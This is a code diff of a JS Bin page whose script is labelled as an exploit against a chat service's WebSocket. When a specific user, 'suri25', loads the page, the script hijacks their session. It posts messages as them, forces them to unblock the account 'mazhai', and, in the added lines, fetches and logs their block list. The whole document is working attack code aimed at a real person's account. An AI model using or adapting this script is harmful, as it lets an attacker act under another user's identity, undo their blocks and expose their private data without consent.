@@ -15,7 +15,6 @@ Released under the MIT license: http://jsbin.mit-license.org
 </head>
 <body>
   <script>
-
     console.log("start exploit...");
     const MSG = "Mazhai :P";
     const ROOM = "kudumi";
@@ -34,9 +33,10 @@ Released under the MIT license: http://jsbin.mit-license.org
           role = jsonData.data.role
            if(jsonData.data.status=="success"){
            	if((user != 'mazhai')&&(user == 'suri25')){
-               window.setInterval(function() {
-                  if(ws.OPEN){send(ROOM, MSG);}
-               }, 20000);
+            	getblocklist();
+               /* window.setInterval(function() {
+                  send(ROOM, MSG);
+               }, 2000); */
             	/* send() */;
             }
            }
@@ -48,9 +48,10 @@ Released under the MIT license: http://jsbin.mit-license.org
           	guestname = guestname + Math.floor((Math.random() * 10) + 1);
             register(guestname);
           }
-          
         }
-  
+      if(dataType=="blocks"){
+				jsonData.data.blocks.forEach((i)=>console.log("blocked",i));
+      }
     }
     console.log("ws--",ws);
     initsession = () => {
@@ -61,10 +62,15 @@ Released under the MIT license: http://jsbin.mit-license.org
     }
     send = (room,msg) => {
     	console.log("state:", guest, user, role);
-      ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":room,"gifinput":"","_gifhidden":"","yinput":"","msg":msg,"type":"text"}}));
-      ws.send(JSON.stringify({"type":"unblock-user","data":{"username":"mazhai"}}));
+      if(ws.OPEN){
+        ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":room,"gifinput":"","_gifhidden":"","yinput":"","msg":msg,"type":"text"}}));
+        ws.send(JSON.stringify({"type":"unblock-user","data":{"username":"mazhai"}}));
+    }}
+    getblocklist = () => {
+    	 if(ws.OPEN){
+       	ws.send(JSON.stringify({"type":"blocks","data":["a"]}));
+       }
     }
-    
     ws.onopen = () => {
       initsession();
 			register(guestname);
@@ -74,7 +80,7 @@ Released under the MIT license: http://jsbin.mit-license.org
 
       window.setTimeout(function() {
         ws.close();
-      }, 180000);
+      }, 4000);
     }
     
     
